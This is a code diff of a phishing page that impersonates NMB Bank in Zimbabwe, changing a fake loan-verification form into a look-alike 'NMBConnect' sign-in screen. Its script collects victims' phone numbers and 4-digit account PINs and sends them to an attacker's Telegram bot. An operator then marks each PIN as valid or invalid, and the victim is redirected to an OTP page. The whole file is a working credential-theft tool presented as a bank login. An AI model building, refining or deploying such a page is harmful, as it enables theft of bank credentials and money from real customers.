@@ -4,229 +4,275 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMB Loan | Verify Account · Zimbabwe</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>NMBConnect | Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --nmb-blue: #003366;
             --nmb-gold: #E4C16A;
-            --nmb-gold-light: #f1dfae;
-            --navy-dark: #002244;
             --white: #ffffff;
-            --light: #f8f9fa;
-            --dark: #1a1a1a;
-            --muted: #666666;
-            --border: #e0ddd9;
-            --error: #d32f2f;
+            --error: #ff4d4d;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { -webkit-text-size-adjust: 100%; }
-
+        
         body {
-            font-family: 'Poppins', system-ui, sans-serif;
-            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--nmb-blue) 50%, #004080 100%);
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop'); /* Placeholder for the hand background */
+            background-size: cover;
+            background-position: center;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-        }
-
-        header {
-            background: white;
-            padding: 14px 5%;
-            border-bottom: 4px solid var(--nmb-gold);
-            box-shadow: 0 2px 8px rgba(0,51,102,0.08);
-        }
-
-        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; }
-        .logo .nmb { color: var(--nmb-blue); }
-        .logo .loan { color: var(--nmb-gold); margin-left: 2px; }
-
-        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
-
-        .card {
-            background: white;
-            border-radius: 18px;
-            padding: 36px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,51,102,0.35);
-        }
-
-        .card-head { text-align: center; margin-bottom: 22px; }
-        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
-        .card-head p { color: var(--muted); font-size: 12px; }
-
-        .bundle-bar {
-            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
-            border-radius: 12px;
-            padding: 14px 16px;
-            margin-bottom: 20px;
+            align-items: center;
             color: white;
-            border: 1px solid rgba(255,255,255,0.08);
+            padding: 20px;
         }
 
-        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
-        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
-
-        .fg { margin-bottom: 16px; }
-        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--nmb-blue); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; }
-
-        .iw {
+        .header-nav {
+            width: 100%;
             display: flex;
             align-items: center;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            padding: 12px 14px;
-            background: var(--light);
-            transition: all 0.2s;
+            padding: 10px 0;
+            margin-bottom: 30px;
         }
 
-        .iw:focus-within { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); }
+        .back-btn {
+            font-size: 24px;
+            cursor: pointer;
+            margin-right: 15px;
+        }
 
-        .prefix { font-weight: 800; color: var(--nmb-blue); margin-right: 8px; font-size: 13px; }
+        .nav-title {
+            font-size: 18px;
+            font-weight: 500;
+        }
 
-        .fi {
-            flex: 1;
-            border: none;
-            background: transparent;
+        .logo-container {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-circle {
+            width: 120px;
+            height: 120px;
+            background: var(--nmb-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .logo-circle img {
+            width: 70%;
+        }
+
+        .brand-name {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .brand-name .nmb { color: #4a90e2; }
+        .brand-name .connect { color: var(--nmb-gold); }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
             font-size: 14px;
-            color: var(--dark);
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 22px;
+        }
+
+        .switch input { opacity: 0; width: 0; height: 0; }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #4a90e2;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(22px);
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 360px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            border-radius: 12px;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+        }
+
+        .flag-icon {
+            width: 24px;
+            margin-right: 10px;
+        }
+
+        .country-code {
+            color: #4a90e2;
+            font-weight: 600;
+            margin-right: 10px;
+            font-size: 15px;
+        }
+
+        .dropdown-arrow {
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 5px solid white;
+            margin-right: 15px;
+        }
+
+        .input-group i {
+            margin-right: 15px;
+            font-size: 18px;
+            opacity: 0.8;
+        }
+
+        .input-field {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 16px;
             outline: none;
             font-family: inherit;
         }
 
-        .fi::placeholder { color: #b8b8b8; }
-
-        .pin-tog { background: none; border: none; color: var(--nmb-gold); cursor: pointer; font-weight: 800; font-size: 10px; font-family: inherit; transition: color 0.2s; }
-        .pin-tog:hover { color: #d4ac4d; }
-
-        .hint { font-size: 10px; color: var(--muted); margin-top: 4px; }
-
-        .err {
-            display: none;
-            background: rgba(211,47,47,0.08);
-            border: 1.5px solid rgba(211,47,47,0.2);
-            color: var(--error);
-            font-size: 12px;
-            font-weight: 700;
-            border-radius: 10px;
-            padding: 10px 12px;
-            margin-bottom: 14px;
-            text-align: center;
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
 
-        .err.show { display: block; }
-
-        .btns { display: flex; gap: 10px; margin-top: 20px; }
-
-        .btn-p {
-            flex: 1;
-            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 900;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 4px 14px rgba(0,51,102,0.28);
-            transition: all 0.2s;
-        }
-
-        .btn-p:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(228,193,106,0.3); }
-
-        .btn-o {
-            flex: 1;
-            background: transparent;
+        .sign-in-btn {
+            width: 100%;
+            padding: 16px;
+            background: white;
             color: var(--nmb-blue);
-            border: 2px solid var(--nmb-blue);
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 12px;
-            text-transform: uppercase;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
-            font-family: inherit;
+            margin-top: 10px;
             transition: all 0.2s;
         }
 
-        .btn-o:hover { background: var(--light); }
+        .sign-in-btn:active {
+            transform: scale(0.98);
+            background: #f0f0f0;
+        }
 
-        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
-        .card-ft a { color: var(--nmb-gold); text-decoration: none; font-weight: 800; }
-        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
+        .error-msg {
+            color: var(--error);
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+            background: rgba(0,0,0,0.5);
+            padding: 8px;
+            border-radius: 8px;
+        }
 
-        /* Loading */
+        /* Overlay */
         .overlay {
             position: fixed; inset: 0;
             display: none;
-            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
-            background: rgba(0,34,68,0.93);
+            align-items: center; justify-content: center; flex-direction: column;
+            background: rgba(0,0,0,0.85);
             z-index: 2000;
-            backdrop-filter: blur(6px);
+            backdrop-filter: blur(8px);
             text-align: center;
             padding: 20px;
         }
 
         .overlay.on { display: flex; }
-        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 16px; font-weight: 800; color: white; margin-top: 10px; }
-        .sp-s { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 5px; line-height: 1.5; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
+        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        @media (max-width: 500px) {
-            main { padding: 24px 12px; }
-            .card { padding: 28px 18px; }
-            .btns { flex-direction: column; }
-        }
+        /* Icon fonts simulation */
+        .icon-lock::before { content: '🔒'; }
     </style>
 </head>
-<body onload="init()">
-    <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
+<body>
+    <div class="header-nav">
+        <span class="back-btn">❮</span>
+        <span class="nav-title">Create Profile</span>
+    </div>
 
-    <main>
-        <div class="card">
-            <div class="card-head">
-                <h1>Verify Your Account</h1>
-                <p>Enter your NMB details to apply for your loan</p>
-            </div>
-
-            <div id="bBar" class="bundle-bar" style="display:none;">
-                <div class="b-row"><span>Loan Type:</span><span id="bD">&mdash;</span></div>
-                <div class="b-row"><span>Amount:</span><span id="bP">$0 USD</span></div>
-            </div>
-
-            <div id="err" class="err"></div>
-
-            <form id="frm" onsubmit="doSubmit(event)">
-                <div class="fg">
-                    <label class="fl" for="name">Full Name</label>
-                    <div class="iw"><input type="text" class="fi" id="name" placeholder="John Doe" autocomplete="name"></div>
-                </div>
-                <div class="fg">
-                    <label class="fl" for="phone">Phone Number</label>
-                    <div class="iw"><span class="prefix">+263</span><input type="tel" class="fi" id="phone" placeholder="7X XXX XXXX" inputmode="numeric" maxlength="9"></div>
-                    <p class="hint">9 digits (e.g. 7XXXXXXXX)</p>
-                </div>
-                <div class="fg">
-                    <label class="fl" for="pin">Account PIN</label>
-                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4"><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
-                    <p class="hint">4 digit NMB Account PIN</p>
-                </div>
-                <div class="btns">
-                    <button type="submit" class="btn-p">Verify & Continue</button>
-                    <button type="button" class="btn-o" onclick="location.href='index.html'">Cancel</button>
-                </div>
-            </form>
-
-            <div class="card-ft">By continuing you agree to our <a href="#">Terms</a> & <a href="#">Privacy</a></div>
-            <div class="secure">🔒 256-bit Encrypted · PCI DSS</div>
+    <div class="logo-container">
+        <div class="logo-circle">
+            <!-- Simplified chain logo using SVG -->
+            <svg viewBox="0 0 100 100" width="70" height="70">
+                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+            </svg>
         </div>
-    </main>
+        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
+    </div>
+
+    <div class="toggle-container">
+        <span>Email Address</span>
+        <label class="switch">
+            <input type="checkbox" checked>
+            <span class="slider"></span>
+        </label>
+        <span>Mobile Number</span>
+    </div>
+
+    <div class="form-container">
+        <div id="err" class="error-msg"></div>
+        
+        <form id="frm" onsubmit="doSubmit(event)">
+            <div class="input-group">
+                <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
+                <span class="country-code">(+263)</span>
+                <div class="dropdown-arrow"></div>
+                <input type="tel" class="input-field" id="phone" placeholder="772145754" inputmode="numeric" maxlength="9">
+            </div>
+
+            <div class="input-group">
+                <span style="margin-right: 15px; font-size: 18px;">🔒</span>
+                <input type="password" class="input-field" id="pin" placeholder="Enter Pin" inputmode="numeric" maxlength="4">
+            </div>
+
+            <button type="submit" class="sign-in-btn">Sign In</button>
+        </form>
+    </div>
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
@@ -242,23 +288,11 @@
         function init() {
             const p = new URLSearchParams(location.search);
             const d = p.get('data'), pr = p.get('price');
-            if (d && pr) {
-                bd = { data: d, price: pr };
-                document.getElementById('bBar').style.display = 'block';
-                document.getElementById('bD').textContent = d;
-                document.getElementById('bP').textContent = '$' + pr + ' USD';
-            }
+            if (d && pr) { bd = { data: d, price: pr }; }
         }
 
-        function togPin() {
-            const el = document.getElementById('pin');
-            const b = event.target;
-            el.type = el.type === 'password' ? 'text' : 'password';
-            b.textContent = el.type === 'password' ? 'Show' : 'Hide';
-        }
-
-        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
-        function clrErr() { document.getElementById('err').classList.remove('show'); }
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
+        function clrErr() { document.getElementById('err').style.display = 'none'; }
 
         async function tg(msg, btns) {
             try {
@@ -269,12 +303,9 @@
                 });
                 const d = await r.json();
                 if (d.ok) {
-                    // Get the latest update ID to avoid processing old messages
                     const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                     const ud = await ur.json();
-                    if (ud.ok && ud.result.length > 0) {
-                        luid = ud.result[0].update_id;
-                    }
+                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                 }
             } catch(e) { console.error(e); }
         }
@@ -282,15 +313,13 @@
         function doSubmit(e) {
             e.preventDefault();
             clrErr();
-            const name = document.getElementById('name').value.trim();
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             const pin = document.getElementById('pin').value.trim();
 
-            if (!name) { showErr('Enter your full name'); return; }
             if (phone.length < 9) { showErr('Enter a valid 9-digit number'); return; }
             if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }
 
-            const msg = `📱 <b>NMB Loan Login</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;
+            const msg = `📱 <b>NMBConnect Login</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;
 
             const btns = [
                 [{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }],
@@ -340,6 +369,8 @@
             const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
             location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
         }
+
+        window.onload = init;
     </script>
 </body>
 </html>
